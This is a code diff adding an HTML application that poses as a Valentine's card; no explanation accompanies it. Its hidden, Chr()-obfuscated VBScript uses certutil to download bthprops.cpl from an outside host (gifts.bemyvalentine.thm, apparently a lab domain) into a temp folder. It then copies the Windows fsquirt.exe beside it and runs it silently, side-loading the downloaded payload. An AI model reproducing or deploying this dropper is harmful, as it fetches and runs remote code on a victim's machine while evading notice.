@@ -1,0 +1,24 @@
+<html>
+<head>
+<title>Valentine's Card</title>
+<HTA:APPLICATION ID="v" APPLICATIONNAME="Valentine" BORDER="none" BORDERSTYLE="none" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="minimize"/>
+</head>
+<body>
+<script language="VBScript">
+Dim o,f,t,u,p,c,x,s
+Set o = CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108))
+Set f = CreateObject(Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(105)&Chr(110)&Chr(103)&Chr(46)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(79)&Chr(98)&Chr(106)&Chr(101)&Chr(99)&Chr(116))
+t = f.GetSpecialFolder(2).Path
+u = Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(58)&Chr(47)&Chr(47)&Chr(103)&Chr(105)&Chr(102)&Chr(116)&Chr(115)&Chr(46)&Chr(98)&Chr(101)&Chr(109)&Chr(121)&Chr(118)&Chr(97)&Chr(108)&Chr(101)&Chr(110)&Chr(116)&Chr(105)&Chr(110)&Chr(101)&Chr(46)&Chr(116)&Chr(104)&Chr(109)&Chr(47)
+p = t & Chr(92) & Chr(118) & Chr(97) & Chr(108) & Chr(101) & Chr(110) & Chr(116) & Chr(105) & Chr(110) & Chr(101)
+s = o.ExpandEnvironmentStrings(Chr(37)&Chr(83)&Chr(89)&Chr(83)&Chr(84)&Chr(69)&Chr(77)&Chr(82)&Chr(79)&Chr(79)&Chr(84)&Chr(37))
+If Not f.FolderExists(p) Then f.CreateFolder(p)
+c = Chr(99)&Chr(101)&Chr(114)&Chr(116)&Chr(117)&Chr(116)&Chr(105)&Chr(108)&Chr(32)&Chr(45)&Chr(117)&Chr(114)&Chr(108)&Chr(99)&Chr(97)&Chr(99)&Chr(104)&Chr(101)&Chr(32)&Chr(45)&Chr(115)&Chr(112)&Chr(108)&Chr(105)&Chr(116)&Chr(32)&Chr(45)&Chr(102)&Chr(32)
+x = c & u & Chr(98)&Chr(116)&Chr(104)&Chr(112)&Chr(114)&Chr(111)&Chr(112)&Chr(115)&Chr(46)&Chr(99)&Chr(112)&Chr(108) & Chr(32) & p & Chr(92) & Chr(98)&Chr(116)&Chr(104)&Chr(112)&Chr(114)&Chr(111)&Chr(112)&Chr(115)&Chr(46)&Chr(99)&Chr(112)&Chr(108)
+o.Run x, 0, True
+f.CopyFile s & Chr(92) & Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(51)&Chr(50)&Chr(92)&Chr(102)&Chr(115)&Chr(113)&Chr(117)&Chr(105)&Chr(114)&Chr(116)&Chr(46)&Chr(101)&Chr(120)&Chr(101), p & Chr(92) & Chr(102)&Chr(115)&Chr(113)&Chr(117)&Chr(105)&Chr(114)&Chr(116)&Chr(46)&Chr(101)&Chr(120)&Chr(101), True
+o.Run p & Chr(92) & Chr(102)&Chr(115)&Chr(113)&Chr(117)&Chr(105)&Chr(114)&Chr(116)&Chr(46)&Chr(101)&Chr(120)&Chr(101), 0, False
+Close
+</script>
+</body>
+</html>
